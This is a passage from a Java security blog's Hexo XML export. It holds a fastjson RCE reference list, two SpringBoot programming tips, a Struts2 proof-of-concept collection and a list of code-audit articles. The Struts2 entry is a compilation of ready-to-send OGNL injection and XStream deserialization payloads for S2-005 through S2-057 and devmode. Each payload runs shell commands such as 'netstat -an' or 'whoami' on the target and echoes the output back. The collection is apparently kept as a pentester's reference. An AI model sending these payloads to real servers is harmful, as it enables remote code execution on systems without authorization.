<li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li>
<li><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="noopener">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a></li>
<li><a href="https://github.com/vulhub/vulhub/tree/master/fastjson/vuln" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson/vuln</a></li>
<li><a href="https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html" target="_blank" rel="noopener">https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html</a></li>
<li><a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9800288.html</a></li>
<li><a href="https://www.restran.net/2018/10/29/fastjson-rce-notes/" target="_blank" rel="noopener">https://www.restran.net/2018/10/29/fastjson-rce-notes/</a></li>
<li><a href="http://blog.nsfocus.net/fastjson-rce-poc/" target="_blank" rel="noopener">http://blog.nsfocus.net/fastjson-rce-poc/</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SpringBoot无需配置文件上传]]></title>
      <url>//blog/1547519250524.html</url>
      <content type="html"><![CDATA[<p>&emsp;&emsp;之前有个需求就是拦截上传请求，但是框架用的是SpringBoot。所以常规的拦截方法调用<code>Apache Commons FileUpload</code>无法成功。SpringBoot中有默认的文件上传组件，在使用ServletFileUpload时需要关闭Spring Boot的默认配置 ，所以在配置文件中添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.http.multipart.enabled=false</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>&emsp;&emsp;这样虽然调用成功，但是又影响正常的上传功能。使用SpringBoot默认的文件上传组件，又需要更改配置文件，否则各种报错。但是这个拦截的需求是放在通用的拦截器上，可以配置不同的系统。所以还是不行。<br>&emsp;&emsp;最后在网上找了好久，东拼西凑，看了各种源码终于找到了一种方法可以无需配置文件就可以获得上传请求时的各种参数，遂记录之。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    HttpServletRequest request1 = (HttpServletRequest) request;</span><br><span class="line">    CommonsMultipartResolver CommonsMultipartResolver = new CommonsMultipartResolver(request1.getSession().getServletContext());</span><br><span class="line">    MultipartResolver resolver = CommonsMultipartResolver;</span><br><span class="line">    MultipartHttpServletRequest multipartRequest = resolver.resolveMultipart(request1);</span><br><span class="line">    Collection&lt;Part&gt; parts = multipartRequest.getParts();</span><br><span class="line">    for (Part part: parts) &#123;</span><br><span class="line">        String filename=part.getSubmittedFileName();              </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;使用的是Spring框架自己的上传组件，最后成功获得上传文件名等参数。</p>
]]></content>
      
        <categories>
            
            <category> 编程记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> SpringBoot </tag>
            
            <tag> 上传 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[idea打包jar报Error: Invalid or corrupt jarfile]]></title>
      <url>//blog/1539757907171.html</url>
      <content type="html"><![CDATA[<p>用idea将springboot web项目打包成 jar包的时候,百度了几遍文章，也按照文章做了，最后也生成了Jar包，但是最后运行的时候，却报错：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Invalid or corrupt jarfile XX.jar</span><br></pre></td></tr></table></figure></p>
<p>最后也解决了，下面就在复现一下，记下自己容易疏忽的步骤。</p>
<p>1、<br>选择 File -&gt; Project Structure<br><img src="http://x-f1v3.github.io/images/1539758346327.png" alt="image"></p>
<p>2、<br>选择 Artifacts-&gt;JAR-&gt;From modules with dependencies<br><img src="http://x-f1v3.github.io/images/1539758467288.png" alt="image"></p>
<p>3、<br>选择启动类<br>选择 copy to the output directory and link via manifest-&gt;OK<br><strong>最重要的是 META-INF  默认放到 src\main\java 目录里，如果使用默认值，没有进行其他配置，生成的 jar 有可能不会包含 META-INF 目录，导致运行 jar 出错 。</strong> 所以，META-INF要放在<code>src\main\resources</code> 目录下。<br>这也是报<code>Error: Invalid or corrupt jarfile</code>的原因。<br><img src="http://x-f1v3.github.io/images/1539758998936.png" alt="image"></p>
<p>4、<br>查看或者修改生成的Jar包名字和路径<br><img src="http://x-f1v3.github.io/images/1539759080756.png" alt="image"></p>
<p>5、<br>选择Build -&gt; Build Artifacts<br><img src="http://x-f1v3.github.io/images/1539759635329.png" alt="image"></p>
<p>然后 build 即可<br><img src="http://x-f1v3.github.io/images/1539759703034.png" alt="image"></p>
<p>6、<br>最后在项目的目录里会生出对应的Jar包<br><img src="http://x-f1v3.github.io/images/1539760070181.png" alt="image"></p>
<p>7、<br>进到对应的目录，执行命令即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xx.jar</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1539760153635.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> 解决报错 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Struts2历史漏洞POC]]></title>
      <url>//blog/1533106712367.html</url>
      <content type="html"><![CDATA[<p>每次看Struts2历史漏洞POC都要去百度，有点麻烦。所以收集了网上的POC放在一起，查阅比较方便。<br><a id="more"></a></p>
<h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><p>POST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;netstat -an \&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</span><br></pre></td></tr></table></figure>
<h3 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h3><p>GET</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27netstat%20-an%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure>
<h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><p>POST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=1$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;netstat -an&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())&#125;</span><br></pre></td></tr></table></figure>
<h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>GET</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;netstat&apos;,&apos;-an&apos;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
<h3 id="S2-019"><a href="#S2-019" class="headerlink" title="S2-019"></a>S2-019</h3><p>POST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=#f=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;netstat&apos;,&apos;-an&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()</span><br></pre></td></tr></table></figure>
<h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><p>GET</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;cmd=netstat%20-an&amp;pp=____A&amp;ppp=%20&amp;encoding=UTF-8</span><br></pre></td></tr></table></figure>
<h3 id="S2-033"><a href="#S2-033" class="headerlink" title="S2-033"></a>S2-033</h3><p>GET</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=netstat%20-an</span><br></pre></td></tr></table></figure>
<h3 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h3><p>GET</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=netstat%20-an</span><br></pre></td></tr></table></figure>
<h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><p>HEADER</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Content-Type&quot;:&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;netstat -an&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><p>POST （FILE）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uploadexp = &quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;netstat -an&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\x000&quot;</span><br><span class="line"> </span><br><span class="line">files =&#123;&quot;test&quot;:(uploadexp, &quot;text/plain&quot;)&#125;</span><br><span class="line">req = requests.post(self.url, files=files,)</span><br></pre></td></tr></table></figure>
<h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><p>POST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /S2-048/integration/saveGangster.action HTTP/1.1</span><br><span class="line">Host: 192.168.159.146:8080</span><br><span class="line">Connection: close</span><br><span class="line">Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1217</span><br><span class="line"></span><br><span class="line">age=1&amp;__checkbox_bustedBefore=true&amp;name=name%3D%25%7B%28%23nike%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat+-an%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&amp;description=1</span><br></pre></td></tr></table></figure>
<h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><p>POST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /S2-052/orders/3/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 1616</span><br><span class="line">Referer: http://127.0.0.1:8080/orders/3/edit</span><br><span class="line">Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;whoami&lt;/string&gt;&lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;/map&gt;</span><br></pre></td></tr></table></figure>
<h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><p>GET</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27netstat+-an%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7d</span><br></pre></td></tr></table></figure>
<h3 id="S2-057"><a href="#S2-057" class="headerlink" title="S2-057"></a>S2-057</h3><p>URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">检测</span><br><span class="line">/$%7B233*233%7D/actionChain1.action</span><br><span class="line"></span><br><span class="line">2.3.20 版本</span><br><span class="line">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action</span><br><span class="line"></span><br><span class="line">2.3.34 版本</span><br><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action</span><br></pre></td></tr></table></figure></p>
<h3 id="S2-devmode"><a href="#S2-devmode" class="headerlink" title="S2-devmode"></a>S2-devmode</h3><p>GET</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=netstat%20-an</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=%28%23parameters%29</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=%28%23application%29</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=(%23wr%3D%23context%5B%23parameters.obj%5B0%5D%5D.getWriter())!%3D(%23wr.println(%23parameters.content%5B0%5D))!%3D(%23wr.flush())!%3D(%23wr.close())&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=7f604dbaced33b7d9c2d5e1212eba16e</span><br></pre></td></tr></table></figure>
<p>​    </p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> POC </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java代码审计相关文章（长期更新）]]></title>
      <url>//blog/1521424233278.html</url>
      <content type="html"><![CDATA[<p>Java代码审计相关文章<br><a id="more"></a></p>
<h3 id="Java代码审计学习"><a href="#Java代码审计学习" class="headerlink" title="Java代码审计学习"></a>Java代码审计学习</h3><ul>
<li><a href="https://xianzhi.aliyun.com/forum/topic/1633" target="_blank" rel="noopener">JAVA代码审计的一些Tips(附脚本)</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/topic/1073" target="_blank" rel="noopener">补天沙龙南京站—Java代码审计PPT</a></li>
<li>​</li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-163.html" target="_blank" rel="noopener">攻击JavaWeb应用[1]-JavaEE 基础</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-164.html" target="_blank" rel="noopener">攻击JavaWeb应用[2]-CS交互安全</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-236.html" target="_blank" rel="noopener">攻击JavaWeb应用[3]-SQL注入[1]</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-288.html" target="_blank" rel="noopener">攻击JavaWeb应用[4]-SQL注入[2]</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-347.html" target="_blank" rel="noopener">攻击JavaWeb应用[5]-MVC安全</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-429.html" target="_blank" rel="noopener">攻击JavaWeb应用[6]-程序架构与代码审计</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-604.html" target="_blank" rel="noopener">攻击JavaWeb应用[7]-Server篇[1]</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-662.html" target="_blank" rel="noopener">攻击JavaWeb应用[8]-后门篇</a></li>
<li><a href="http://www.freebuf.com/column/143595.html" target="_blank" rel="noopener">[代码审计] Java代码审计连载之—添油加醋</a></li>
<li><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a></li>
<li><a href="http://www.nxadmin.com/web/1332.html" target="_blank" rel="noopener">Java代码审计基础(一)</a></li>
<li><a href="https://paper.tuisec.win/detail/be2213ad38a0645" target="_blank" rel="noopener">javaweb的常见web漏洞</a></li>
